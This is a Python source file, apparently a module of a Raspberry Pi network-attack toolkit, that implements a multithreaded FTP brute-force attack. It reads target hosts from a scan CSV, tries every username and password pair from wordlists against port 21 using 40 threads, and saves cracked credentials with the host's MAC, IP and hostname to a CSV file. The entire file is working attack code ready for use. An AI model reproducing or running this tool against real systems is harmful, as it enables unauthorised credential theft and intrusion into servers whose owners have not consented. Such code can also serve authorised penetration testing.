import os
import pandas as pd
import threading
import logging
import time
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
from ftplib import FTP
from queue import Queue
from shared import SharedData
from logger import Logger

logger = Logger(name="ftp_connector.py", level=logging.DEBUG)

b_class = "FTPBruteforce"
b_module = "ftp_connector"
b_status = "brute_force_ftp"
b_port = 21
b_parent = None

class FTPBruteforce:
    """
    This class handles the FTP brute force attack process.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.ftp_connector = FTPConnector(shared_data)
        logger.info("FTPConnector initialized.")

    def bruteforce_ftp(self, ip, port):
        """
        Initiates the brute force attack on the given IP and port.
        """
        return self.ftp_connector.run_bruteforce(ip, port)
    
    def execute(self, ip, port, row, status_key):
        """
        Executes the brute force attack and updates the shared data status.
        """
        self.shared_data.bjornorch_status = "FTPBruteforce"
        # Wait a bit because it's too fast to see the status change
        time.sleep(5)
        logger.info(f"Brute forcing FTP on {ip}:{port}...")
        success, results = self.bruteforce_ftp(ip, port)
        return 'success' if success else 'failed'

class FTPConnector:
    """
    This class manages the FTP connection attempts using different usernames and passwords.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.scan = pd.read_csv(shared_data.netkbfile)

        if "Ports" not in self.scan.columns:
            self.scan["Ports"] = None
        self.scan = self.scan[self.scan["Ports"].str.contains("21", na=False)]

        self.users = open(shared_data.usersfile, "r").read().splitlines()
        self.passwords = open(shared_data.passwordsfile, "r").read().splitlines()

        self.lock = threading.Lock()
        self.ftpfile = shared_data.ftpfile
        if not os.path.exists(self.ftpfile):
            logger.info(f"File {self.ftpfile} does not exist. Creating...")
            with open(self.ftpfile, "w") as f:
                f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
        self.results = []  
        self.queue = Queue()
        self.console = Console()

    def load_scan_file(self):
        """
        Load the netkb file and filter it for FTP ports.
        """
        self.scan = pd.read_csv(self.shared_data.netkbfile)

        if "Ports" not in self.scan.columns:
            self.scan["Ports"] = None
        self.scan = self.scan[self.scan["Ports"].str.contains("21", na=False)]

    def ftp_connect(self, adresse_ip, user, password):
        """
        Attempts to connect to the FTP server using the provided username and password.
        """
        try:
            conn = FTP()
            conn.connect(adresse_ip, 21)
            conn.login(user, password)
            conn.quit()
            logger.info(f"Access to FTP successful on {adresse_ip} with user '{user}'")
            return True
        except Exception as e:
            return False

    def worker(self, progress, task_id, success_flag):
        """
        Worker thread to process items in the queue.
        """
        while not self.queue.empty():
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping worker thread.")
                break

            adresse_ip, user, password, mac_address, hostname, port = self.queue.get()
            if self.ftp_connect(adresse_ip, user, password):
                with self.lock:
                    self.results.append([mac_address, adresse_ip, hostname, user, password, port])
                    logger.success(f"Found credentials for IP: {adresse_ip} | User: {user}")
                    self.save_results()
                    self.removeduplicates()
                    success_flag[0] = True
            self.queue.task_done()
            progress.update(task_id, advance=1)

    def run_bruteforce(self, adresse_ip, port):
        self.load_scan_file()  # Reload the scan file to get the latest IPs and ports

        mac_address = self.scan.loc[self.scan['IPs'] == adresse_ip, 'MAC Address'].values[0]
        hostname = self.scan.loc[self.scan['IPs'] == adresse_ip, 'Hostnames'].values[0]

        total_tasks = len(self.users) * len(self.passwords) + 1  # Include one for the anonymous attempt
        
        for user in self.users:
            for password in self.passwords:
                if self.shared_data.orchestrator_should_exit:
                    logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
                    return False, []
                self.queue.put((adresse_ip, user, password, mac_address, hostname, port))

        success_flag = [False]
        threads = []

        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
            task_id = progress.add_task("[cyan]Bruteforcing FTP...", total=total_tasks)

            for _ in range(40):  # Adjust the number of threads based on the RPi Zero's capabilities
                t = threading.Thread(target=self.worker, args=(progress, task_id, success_flag))
                t.start()
                threads.append(t)

            while not self.queue.empty():
                if self.shared_data.orchestrator_should_exit:
                    logger.info("Orchestrator exit signal received, stopping bruteforce.")
                    while not self.queue.empty():
                        self.queue.get()
                        self.queue.task_done()
                    break

            self.queue.join()

            for t in threads:
                t.join()

        return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful

    def save_results(self):
        """
        Saves the results of successful FTP connections to a CSV file.
        """
        df = pd.DataFrame(self.results, columns=['MAC Address', 'IP Address', 'Hostname', 'User', 'Password', 'Port'])
        df.to_csv(self.ftpfile, index=False, mode='a', header=not os.path.exists(self.ftpfile))
        self.results = []  # Reset temporary results after saving

    def removeduplicates(self):
        """
        Removes duplicate entries from the results file.
        """
        df = pd.read_csv(self.ftpfile)
        df.drop_duplicates(inplace=True)
        df.to_csv(self.ftpfile, index=False)

if __name__ == "__main__":
    shared_data = SharedData()
    try:
        ftp_bruteforce = FTPBruteforce(shared_data)
        logger.info("[bold green]Starting FTP attack...on port 21[/bold green]")
        
        # Load the IPs to scan from shared data
        ips_to_scan = shared_data.read_data()
        
        # Execute brute force attack on each IP
        for row in ips_to_scan:
            ip = row["IPs"]
            ftp_bruteforce.execute(ip, b_port, row, b_status)
        
        logger.info(f"Total successful attempts: {len(ftp_bruteforce.ftp_connector.results)}")
        exit(len(ftp_bruteforce.ftp_connector.results))
    except Exception as e:
        logger.error(f"Error: {e}")
